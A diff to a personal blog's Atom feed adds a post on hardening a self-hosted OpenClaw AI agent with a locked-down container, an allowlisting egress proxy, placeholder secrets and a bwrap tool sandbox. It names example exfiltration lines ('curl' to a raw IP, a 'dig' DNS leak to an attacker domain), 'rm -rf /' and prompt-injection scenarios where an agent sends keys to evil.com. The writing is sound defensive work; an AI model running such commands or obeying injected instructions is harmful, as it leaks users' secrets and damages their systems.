@@ -5,11 +5,198 @@
   <subtitle>Out of band thinking</subtitle>
   <link href="https://raka.gunar.to/feed/feed.xml" rel="self" />
   <link href="https://raka.gunar.to/" />
-  <updated>2026-02-26T00:00:00Z</updated>
+  <updated>2026-03-02T00:00:00Z</updated>
   <id>https://raka.gunar.to/</id>
   <author>
     <name>Raka Gunarto</name>
   </author>
+  <entry>
+    <title>How I Hardened My OpenClaw Deployment</title>
+    <link href="https://raka.gunar.to/blog/2026/03/02/paranoidclaw/" />
+    <updated>2026-03-02T00:00:00Z</updated>
+    <id>https://raka.gunar.to/blog/2026/03/02/paranoidclaw/</id>
+    <content type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;A few weeks ago I wrote about &lt;a href=&quot;https://raka.gunar.to/blog/2026/02/10/zero-trust-llm-agent/&quot;&gt;The Plumber With A Skeleton Key&lt;/a&gt;,
+where I argued that giving fully autonomous AI agents unrestricted access to your machine
+is roughly as sensible as handing a random stranger on the street the keys to your house,
+your car, and your identity.&lt;/p&gt;
+&lt;p&gt;This post dives into the &lt;em&gt;how&lt;/em&gt; that goes a little further than a &lt;code&gt;docker-compose.yml&lt;/code&gt; snippet.&lt;/p&gt;
+&lt;p&gt;I built &lt;a href=&quot;https://github.com/raka-gunarto/paranoidclaw&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;ParanoidClaw&lt;/a&gt;, my own hardened
+OpenClaw setup. The goal is simple: keep using the genuinely useful parts of OpenClaw
+while assuming it &lt;strong&gt;will&lt;/strong&gt; get prompt-injected or hallucinate &lt;code&gt;rm -rf /&lt;/code&gt; at some point and limiting the damage when it does.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&quot;the-threat-model&quot;&gt;The threat model&lt;/h3&gt;
+&lt;p&gt;To recap, I think of the attack surface in three categories (&lt;a href=&quot;https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;original credit&lt;/a&gt; to Simon Willison, who I forgot to credit last time)&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Access to Data&lt;/strong&gt;: Secrets, SSH keys, browser sessions, files on your machine.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Untrusted Input&lt;/strong&gt;: Emails, web pages, Slack messages, anything the agent reads that you don&#39;t fully control.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Agency&lt;/strong&gt;: Shell access, network access, arbitrary code execution.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;A stock OpenClaw install on your server / daily driver gives you all three. ParanoidClaw&#39;s job is to make each
+of those categories as narrow as possible without making the agent useless.&lt;/p&gt;
+&lt;h3 id=&quot;container-hardening&quot;&gt;Container hardening&lt;/h3&gt;
+&lt;p&gt;The first and most obvious layer: don&#39;t run OpenClaw on your host machine.&lt;/p&gt;
+&lt;p&gt;ParanoidClaw runs OpenClaw inside a Docker container with what I&#39;d consider reasonable
+hardening. Here&#39;s the relevant chunk of the &lt;code&gt;docker-compose.yml&lt;/code&gt;:&lt;/p&gt;
+&lt;pre class=&quot;language-yaml&quot; tabindex=&quot;0&quot;&gt;&lt;code class=&quot;language-yaml&quot;&gt;&lt;span class=&quot;token key atrule&quot;&gt;openclaw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token key atrule&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; .
+      &lt;span class=&quot;token key atrule&quot;&gt;dockerfile&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; Dockerfile.openclaw&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;hardened
+    &lt;span class=&quot;token key atrule&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;65532:65532&quot;&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;cap_drop&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;ALL&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;security_opt&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; no&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;new&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;privileges&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token boolean important&quot;&gt;true&lt;/span&gt;
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; seccomp=openclaw&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;seccomp.json
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; apparmor=openclaw&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;apparmor
+    &lt;span class=&quot;token key atrule&quot;&gt;read_only&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token boolean important&quot;&gt;true&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token boolean important&quot;&gt;true&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;tmpfs&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; /tmp&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;noexec&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;nosuid&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;size=64m
+    &lt;span class=&quot;token key atrule&quot;&gt;mem_limit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 2G
+    &lt;span class=&quot;token key atrule&quot;&gt;cpus&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2.0&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;pids_limit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;200&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Feature&lt;/th&gt;
+&lt;th&gt;Purpose&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;user: &quot;65532:65532&quot;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Runs as unprivileged user; container escape limits attacker access&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;cap_drop: [ALL]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Removes all Linux capabilities; no granular root powers available&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;no-new-privileges: true&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Prevents privilege escalation via SUID binaries&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;seccomp&lt;/code&gt; and &lt;code&gt;apparmor&lt;/code&gt; profiles&lt;/td&gt;
+&lt;td&gt;These are actually slightly relaxed profiles to allow user namespaces for &lt;a href=&quot;https://raka.gunar.to/blog/2026/03/02/paranoidclaw/#bwrap-tool-sandbox&quot;&gt;bwrap sandboxing&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;read_only: true&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Immutable filesystem; only &lt;code&gt;/tmp&lt;/code&gt; and volumes are writable&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;tmpfs&lt;/code&gt; with &lt;code&gt;noexec,nosuid&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Prevents binary execution and SUID exploitation in temp space&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;mem_limit: 2G&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Caps memory usage via cgroups&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;cpus: 2.0&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Limits CPU allocation via cgroups&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;pids_limit: 200&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Prevent PID exhaustion on host&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;The dockerfile itself is minimal, it simply &lt;code&gt;chown&lt;/code&gt;s the &lt;code&gt;/app&lt;/code&gt; dir to user 65532.&lt;/p&gt;
+&lt;h3 id=&quot;egress-proxy-destination-filtering&quot;&gt;Egress proxy: destination filtering&lt;/h3&gt;
+&lt;p&gt;This is the part I&#39;m most satisfied with. Containerisation alone doesn&#39;t help you if the
+agent can still freely talk to the internet. A prompt-injected agent that can &lt;code&gt;curl&lt;/code&gt;
+your secrets to an attacker-controlled server is still a disaster.&lt;/p&gt;
+&lt;p&gt;ParanoidClaw routes &lt;strong&gt;all&lt;/strong&gt; OpenClaw traffic through
+&lt;a href=&quot;https://github.com/raka-gunarto/agent-panopticon&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;agent-panopticon&lt;/a&gt;, a custom &lt;code&gt;mitmproxy&lt;/code&gt;
+addon I wrote. The OpenClaw container has no direct network access, all traffic is forced
+through the &lt;code&gt;mitmproxy&lt;/code&gt; addon via &lt;code&gt;iptables&lt;/code&gt; rules.&lt;/p&gt;
+&lt;p&gt;The proxy enforces a strict &lt;strong&gt;domain allowlist&lt;/strong&gt;. If OpenClaw tries to reach a domain
+that&#39;s not on the list, the request gets blocked with a &lt;code&gt;403&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PANOPTICON: domain &#39;attacker.com&#39; is not in the egress allowlist.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It also blocks direct-IP destinations. No &lt;code&gt;curl https://123.45.67.89/exfil&lt;/code&gt;. If
+it&#39;s not a domain on the allowlist, it doesn&#39;t leave the box.&lt;/p&gt;
+&lt;p&gt;DNS queries are filtered too. If the agent tries to resolve a domain not on the allowlist,
+it gets an &lt;code&gt;NXDOMAIN&lt;/code&gt; response. And because mitmproxy resovles the DNS through the host
+resolver, no DNS exfiltration through &lt;code&gt;dig @&amp;lt;attacker-ip&amp;gt; &quot;my-precious-secrets.attacker.com&quot;&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&quot;egress-proxy-in-flight-secret-substitution&quot;&gt;Egress proxy: in-flight secret substitution&lt;/h3&gt;
+&lt;p&gt;The problem with giving an AI agent API keys: once it has them, a prompt injection
+can exfiltrate them. If the API key exists in the context window or if the agent can
+read the filesystem to find it, it is a risk.&lt;/p&gt;
+&lt;p&gt;ParanoidClaw&#39;s approach is that &lt;strong&gt;OpenClaw never sees the real secrets&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Instead of passing actual API keys to OpenClaw, I give it placeholder strings like
+&lt;code&gt;PLACEHOLDER_SECRET_VALUE_ANTHROPIC_KEY&lt;/code&gt;. The agent uses these placeholders in its
+requests like normal. When the request passes through the proxy, panopticon does
+the swap:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;OpenClaw makes a request to &lt;code&gt;api.anthropic.com&lt;/code&gt; with
+&lt;code&gt;Authorization: Bearer PLACEHOLDER_SECRET_VALUE_ANTHROPIC_KEY&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;The proxy checks: is &lt;code&gt;api.anthropic.com&lt;/code&gt; on the allowlist? Yes.&lt;/li&gt;
+&lt;li&gt;The proxy checks: is &lt;code&gt;ANTHROPIC_KEY&lt;/code&gt; authorised for &lt;code&gt;api.anthropic.com&lt;/code&gt;? Yes.&lt;/li&gt;
+&lt;li&gt;It swaps the placeholder for the real key and forwards the request.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;If the agent gets injected and tries to send that placeholder to &lt;code&gt;evil.com&lt;/code&gt;, two things
+happen: &lt;code&gt;evil.com&lt;/code&gt; isn&#39;t on the allowlist so the request is blocked, and even if it
+were, the placeholder is only authorised for specific domains. The attacker gets a
+useless string either way.&lt;/p&gt;
+&lt;p&gt;This extends to WebSocket messages too, for services like Discord.&lt;/p&gt;
+&lt;p&gt;The real secrets live only in the proxy&#39;s environment (&lt;code&gt;.env.proxy&lt;/code&gt;), which is a
+separate container that OpenClaw cannot access (outside visible filesystem, and
+effective user would have no read access either).&lt;/p&gt;
+&lt;h3 id=&quot;bwrap-tool-sandbox&quot;&gt;&lt;code&gt;bwrap&lt;/code&gt; tool sandbox&lt;/h3&gt;
+&lt;p&gt;Containers are great for isolating the main OpenClaw process, but OpenClaw executes
+tools (shell commands, scripts, code) on behalf of the LLM. Those tool executions
+are where prompt injection actually has destructive power. The current setup wraps
+the OpenClaw main process, but I also want to ensure the tools can&#39;t mess up
+OpenClaw configuration or do anything too crazy.&lt;/p&gt;
+&lt;p&gt;I modified OpenClaw to use &lt;a href=&quot;https://github.com/containers/bubblewrap&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;bubblewrap&lt;/a&gt;
+(&lt;code&gt;bwrap&lt;/code&gt;) as its sandboxing backend for tool executions. &lt;code&gt;bwrap&lt;/code&gt; uses Linux user
+namespaces for unprivileged sandboxing, meaning the OpenClaw process doesn&#39;t
+need root or any extra privileges.&lt;/p&gt;
+&lt;p&gt;Each tool execution gets its own &lt;code&gt;bwrap&lt;/code&gt; sandbox with:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;A minimal filesystem (only what the tool needs)&lt;/li&gt;
+&lt;li&gt;No network access by default&lt;/li&gt;
+&lt;li&gt;No access to the filesystem outside the sandbox&lt;/li&gt;
+&lt;li&gt;Its own isolated namespace&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This means even if a prompt injection tricks the agent into trying to modify
+the configuration to trust some random WhatsApp number, it can&#39;t, because the
+configuration files are not mounted on the containerised root filesystem.&lt;/p&gt;
+&lt;p&gt;I&#39;ve opened a &lt;a href=&quot;https://github.com/openclaw/openclaw/pull/28599&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;PR on the main OpenClaw repo&lt;/a&gt;
+to get the &lt;code&gt;bwrap&lt;/code&gt; backend merged.&lt;/p&gt;
+&lt;p&gt;Note that OpenClaw does provide sandboxing using Docker containers, but that requires
+giving the main process access to a Docker daemon. This meant setting up a rootless
+Docker daemon if I didn&#39;t want a potential escape and host privilege escalation
+through a possible privileged container spawn. &lt;code&gt;bwrap&lt;/code&gt; is a much lighter solution
+in addition to the main process already being containerised.&lt;/p&gt;
+&lt;h3 id=&quot;out-of-scope-pitfalls&quot;&gt;Out-of-scope pitfalls&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;LLM hallucination within allowed actions&lt;/strong&gt;: If you gave the agent access to your
+email and it hallucinates, it can nuke everything inside the allowed scope.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Allowed domain abuse&lt;/strong&gt;: If &lt;code&gt;api.service.com&lt;/code&gt; is allowlisted and the agent is
+injected, it can make arbitrary API calls to that service.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The above are policy issues, not sandboxing problems.&lt;/p&gt;
+&lt;h3 id=&quot;is-this-fully-secure&quot;&gt;Is this fully secure?&lt;/h3&gt;
+&lt;p&gt;Nothing is fully secure. This shrinks the blast radius by quite a bit and also
+leaves it up to the user to have sane access policies for their agent.&lt;/p&gt;
+&lt;p&gt;This particular setup also still shares the host kernel, which is trade-off I&#39;ve accepted.
+My server runs its services as docker containers and I wanted to keep this the same
+for the OpenClaw service. If you wanted to be extra paranoid, adding an extra boundary
+using gVisor or firecracker microVMs would be even safer (or on its own machine).
+Technically speaking, a kernel 0day would be bad news for the server this is running on.&lt;/p&gt;
+&lt;h3 id=&quot;why-bother&quot;&gt;Why bother?&lt;/h3&gt;
+&lt;p&gt;Because I actually want to use these tools (safely)!&lt;/p&gt;
+&lt;p&gt;We know prompt injection is a fundamental, possibly unsolvable problem with the current
+LLM architecture. We know these agents have shell access and network access. We know
+they read untrusted input. The only responsible thing to do is to assume the worst and
+build accordingly.&lt;/p&gt;
+&lt;p&gt;ParanoidClaw is &lt;a href=&quot;https://github.com/raka-gunarto/paranoidclaw&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;on GitHub&lt;/a&gt; if you want
+to use it or pick it apart. It&#39;s also been a genuinely fun excuse to learn more about
+Linux security hardening and networking, which might increase in demand with all these
+fully autonomous agents that can execute arbitrary commands on the rise.&lt;/p&gt;
+&lt;/body&gt;&lt;/html&gt;</content>
+  </entry>
   <entry>
     <title>3000 commits behind origin/main in 6 days</title>
     <link href="https://raka.gunar.to/blog/2026/02/26/death-of-my-craft/" />
